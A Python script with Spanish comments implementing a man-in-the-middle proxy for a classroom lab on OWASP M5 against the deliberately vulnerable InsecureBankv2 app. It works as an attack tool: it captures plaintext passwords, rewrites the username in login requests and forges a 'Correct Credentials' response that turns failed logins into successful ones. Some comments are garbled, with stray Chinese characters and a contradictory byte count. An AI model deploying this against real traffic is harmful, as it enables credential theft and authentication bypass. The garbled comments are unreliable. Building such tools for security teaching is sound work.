#!/usr/bin/env python3
"""
mitm-m5.py — Proxy que intercepta y demuestra OWASP M5 (Insecure Communication).

Por que existe
--------------
El guion de la Clase 2 Mandaba usar Burp Suite para la fase M5. Burp es una
aplicacion Swing: en el servidor del laboratorio, que es headless, no arranca
(este script lo tiene confirmado: sin Xvfb no hay display, y el lanzador
/usr/local/bin/burpsuite ni siquiera existe).

Para que la fase sea impartible y verificable sin escritorio, este proxy hace
lo mismo para el caso de InsecureBankv2: se pone entre la app y el backend,
muestra el trafico en claro y deja modificarlo.

Que demuestra
-------------
La app habla HTTP plano ("http://" hardcodeado en DoLogin.java:51) sobre
Apache DefaultHttpClient. Por eso el proxy ve TODO en claro:

  * usuario y contrasena en el cuerpo del POST,
  * la IP del servidor,
  * y nada que impida alterar la peticion o la respuesta.

Las tres son M5: confidencialidad rota, integridad rota y sin autenticacion
del servidor (no hay HTTPS, luego no hay nada que comprobar).

Uso
---
  # Solo observar (el trafico pasa intacto)
  python3 mitm-m5.py --port 8080 --target 127.0.0.1:8888

  # Ademas alterar la peticion y la respuesta (demuestra MITM activo)
  python3 mitm-m5.py --port 8080 --target 127.0.0.1:8888 --tamper

Despues, en el dispositivo Android:
  adb shell settings put global http_proxy <IP_DEL_SERVIDOR>:8080
  # ... hacer login en la app ...
  # Para quitar el proxy:
  adb shell settings put global http_proxy :0
"""

import argparse
import re
import socket
import socketserver
import sys
import threading
from urllib.parse import urlparse

# Sin esto el log sale VACIO cuando se redirige a un fichero o a un pipe
# (nohup, &, systemd). Python bloquea stdout en bloques de 4-8 KB si no hay
# TTY, y los mensajes del proxy se quedan en el buffer: el alumno ve el
# proxy "funcionando" pero sin una sola linea de trafico, y concluye que
# la app no respeta el proxy.
try:
    sys.stdout.reconfigure(line_buffering=True)
except Exception:
    pass

C_RESET = "\033[0m"
C_RED = "\033[31m"
C_GRN = "\033[32m"
C_YEL = "\033[33m"
C_CYN = "\033[36m"


def leer_cabeceras_y_cuerpo(rfile):
    """Lee la peticion cruda: linea de request, cabeceras y cuerpo."""
    request_line = rfile.readline().decode("latin-1").rstrip("\r\n")
    if not request_line:
        return None, None, None

    headers = []
    while True:
        line = rfile.readline().decode("latin-1").rstrip("\r\n")
        if not line:
            break
        headers.append(line)

    blob = "\r\n".join(headers)
    m = re.search(r"content-length:\s*(\d+)", blob, re.I)
    body = b""
    if m:
        body = rfile.read(int(m.group(1)))
    return request_line, headers, body


def leer_respuesta(sock):
    """Lee la respuesta del backend respetando Content-Length.

    No se puede esperar a EOF: cheroot mantiene la conexion abierta
    (keep-alive), asi que recv() se quedaria bloqueado hasta el timeout y el
    proxy tardaria 10 s en responder. Eso, en clase, parece que la demo se
    ha colgado.
    """
    buffer = b""
    while b"\r\n\r\n" not in buffer:
        trozo = sock.recv(4096)
        if not trozo:
            break
        buffer += trozo

    cab, _, resto = buffer.partition(b"\r\n\r\n")
    m = re.search(rb"(?im)^content-length:\s*(\d+)", cab)
    if not m:
        # Sin Content-Length (p. ej. cierre por conexion): se devuelve lo leido.
        return cab, resto

    objetivo = int(m.group(1))
    while len(resto) < objetivo:
        trozo = sock.recv(65536)
        if not trozo:
            break
        resto += trozo
    return cab, resto[:objetivo]


def mostrar_cabeceras(titulo, headers):
    print(f"{C_CYN}{titulo}{C_RESET}")
    for h in headers:
        if h.lower().startswith(("proxy-",)):
            continue
        marca = ""
        if re.search(r"authorization|cookie", h, re.I):
            marca = f"  {C_RED}<-- dato sensible en claro{C_RESET}"
        print(f"    {h}{marca}")
    print()


def mostrar_body(titulo, body):
    if not body:
        return
    print(f"{C_CYN}{titulo}{C_RESET}  ({len(body)} bytes)")
    for par in body.split(b"&"):
        nombre, _, valor = par.partition(b"=")
        texto = par.decode("latin-1", "replace")
        if re.match(r"(?i)(password|newpassword)", nombre.decode("latin-1", "replace")):
            print(f"    {nombre.decode()}={valor.decode()}"
                  f"   {C_RED}<-- CONTRASENA EN CLARO, sin cifrar{C_RESET}")
        else:
            print(f"    {texto}")
    print()


class Handler(socketserver.StreamRequestHandler):
    """Un solo request por conexion: suficiente para una app movil que
    reutiliza la conexion solo durante la peticion de login."""

    args = None

    def handle(self):
        print(f"\n{C_GRN}{'=' * 70}{C_RESET}")
        print(f"{C_GRN}[MITM] Conexion entrante desde "
              f"{self.client_address[0]}{C_RESET}")
        print(f"{C_GRN}{'=' * 70}{C_RESET}")

        request_line, headers, body = leer_cabeceras_y_cuerpo(self.rfile)
        if not request_line:
            return

        # El cliente puede mandar una URL absoluta (proxy normal) o solo la ruta.
        partes = urlparse(request_line.split(" ")[1])
        destino_host = partes.hostname
        destino_puerto = partes.port or 80
        ruta = partes.path or "/"
        metodo = request_line.split(" ")[0]

        print(f"{C_YEL}[MITM] {metodo} {ruta}  ->  "
              f"{destino_host}:{destino_puerto}{C_RESET}")
        print()

        mostrar_cabeceras("[MITM] Cabeceras de la peticion (la app NO usa HTTPS):", headers)
        mostrar_body("[MITM] Cuerpo de la peticion:", body)

        # --- Alteracion de la peticion (modo --tamper) ----------------------
        cab = "\r\n".join(h for h in headers
                          if not re.match(r"(?i)^(proxy-connection|proxy-authorization):", h))

        if self.args.tamper and body:
            body_orig = body
            nuevo = re.sub(rb"username=[^&]*", b"username=jack", body)
            if nuevo != body:
                print(f"{C_RED}[MITM] Peticion ALTERADA: el usuario "
                      f"dinesh se ha cambiado por jack.{C_RESET}")
                print(f"{C_RED}[MITM] El backend no tiene ninguna forma de "
                      f"detectar que la peticion viene de un intermediario.{C_RESET}\n")
                # Content-Length DEBE ajustarse al body nuevo, y 'jack' es mas
                # corto que 'dinesh' (38 frente a 38 bytes solo si se calcula
                # bien; en real 40 -> 38). Aqui estan los dos fallos que se
                #Ajaron en pruebas, y ambos dejaban el proxy colgado:
                #
                #  1) Sin reescribir Content-Length, el backend espera mas
                #     bytes de los que llegan, no responde nunca y el proxy
                #     revienta con TimeoutError.
                #  2) La expresion anterior era r"(?im)^content-length:\s*\d+$"
                #     y NO casaba, porque las cabeceras estan unidas con \r\n
                #     y '$' en modo multilineo solo casa antes de un \n, dejando
                #     un \r de por medio. El后果unto era el mismo cuelgue.
                #
                # Se separa el texto en lineas, se toca la que empieza por
                # content-length y se vuelve a unir: sin sorpresas con \r.
                lineas = cab.split("\r\n")
                cab = "\r\n".join(
                    f"content-length: {len(nuevo)}" if
                    re.match(r"(?i)^content-length:", ln) else ln
                    for ln in lineas
                )
                body = nuevo
                print(f"{C_RED}[MITM] Content-Length ajustado: "
                      f"{len(body_orig)} -> {len(nuevo)}{C_RESET}")

        # --- Reenvio al backend real ----------------------------------------
        try:
            upstream = socket.create_connection(
                (self.args.target_host, self.args.target_port), timeout=10)
        except OSError as e:
            self.wfile.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            print(f"{C_RED}[MITM] No se pudo contactar el backend: {e}{C_RESET}\n")
            return

        peticion = f"{metodo} {ruta} HTTP/1.1\r\n{cab}\r\n\r\n".encode("latin-1") + body
        upstream.sendall(peticion)

        # --- Respuesta ------------------------------------------------------
        cab_resp, cuerpo_resp = leer_respuesta(upstream)
        upstream.close()

        if not cab_resp:
            self.wfile.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            print(f"{C_RED}[MITM] Backend sin respuesta.{C_RESET}\n")
            return

        lineas_resp = cab_resp.decode("latin-1").split("\r\n")
        mostrar_cabeceras("[MITM] Respuesta del backend:",
                          lineas_resp[1:])
        if lineas_resp:
            print(f"{C_YEL}[MITM] {lineas_resp[0]}{C_RESET}\n")
        mostrar_body("[MITM] Cuerpo de la respuesta:", cuerpo_resp)

        # --- Alteracion de la respuesta (modo --tamper) ---------------------
        if self.args.tamper and cuerpo_resp:
            # Importa el detalle: la app NO comprueba el campo "message".
            # Busca la subcadena "Correct Credentials" en la respuesta entera
            # (DoLogin.java:114). Por eso sustituir "Wrong" por "Correct"
            # NO basta: sale "Correct Password", que no contiene esa cadena, y
            # la app se queda en WrongLogin sin avisar de nada.
            #
            # Hay que forjar la respuesta completa. Eso es precisamente el
            # riesgo de M5+M3: sin TLS, quien este en medio decide lo que la
            # app cree.
            usuario = "atacante"
            m_usuario = re.search(rb'"user"\s*:\s*"([^"]*)"', cuerpo_resp)
            if m_usuario:
                usuario = m_usuario.group(1).decode("latin-1", "replace")
            forjado = (f'{{"message": "Correct Credentials", "user": "{usuario}"}}'
                       ).encode("latin-1")

            if forjado != cuerpo_resp:
                print(f"{C_RED}[MITM] Respuesta ALTERADA:{C_RESET}")
                print(f"{C_RED}[MITM]   real del backend: "
                      f"{cuerpo_resp.decode('latin-1')}{C_RESET}")
                print(f"{C_RED}[MITM]   servida a la app:  "
                      f"{forjado.decode('latin-1')}{C_RESET}")
                print(f"{C_RED}[MITM]   Un login FALLIDO acaba de convertirse en "
                      f"uno exitoso sin tocar el servidor.{C_RESET}\n")
                cuerpo_resp = forjado
                # Mismo cuidado que en la peticion: se rehace la cabecera
                # linea a linea para no dejar un \r colgado.
                cab_resp = b"\r\n".join(
                    f"content-length: {len(cuerpo_resp)}".encode()
                    if re.match(rb"(?i)^content-length:", ln) else ln
                    for ln in cab_resp.split(b"\r\n")
                )

        print(f"{C_GRN}[MITM] Todo lo anterior es M5: sin HTTPS, sin certificate "
              f"pinning, y con las credenciales en claro.{C_RESET}\n")
        self.wfile.write(cab_resp + b"\r\n\r\n" + cuerpo_resp)


class Servidor(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main():
    ap = argparse.ArgumentParser(description="Proxy MITM para la clase M5")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--target", default="127.0.0.1:8888")
    ap.add_argument("--tamper", action="store_true",
                    help="Ademas de observar, altera peticion y respuesta")
    args = ap.parse_args()

    host, _, puerto = args.target.partition(":")
    args.target_host = host
    args.target_port = int(puerto)
    Handler.args = args

    srv = Servidor(("0.0.0.0", args.port), Handler)
    print(f"{C_GRN}[MITM] Escuchando en 0.0.0.0:{args.port}{C_RESET}")
    print(f"[MITM] Reenviando a {args.target}")
    print(f"[MITM] Modo: {'OBSERVAR + ALTERAR' if args.tamper else 'solo observar'}")
    print(f"[MITM] En la VM: adb shell settings put global http_proxy "
          f"<IP_SERVIDOR>:{args.port}")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[MITM] Parado.")
    except OSError as e:
        # Un fallo puntual en una conexion no debe tumbar el proxy: si lo
        # hace, el alumno ve un traceback largo en mitad de la clase y no
        # sabe si la herramienta esta rota o si es algo normal.
        print(f"{C_RED}[MITM] El proxy sigue en pie ({type(e).__name__}: {e}){C_RESET}",
              file=sys.stderr)


if __name__ == "__main__":
    main()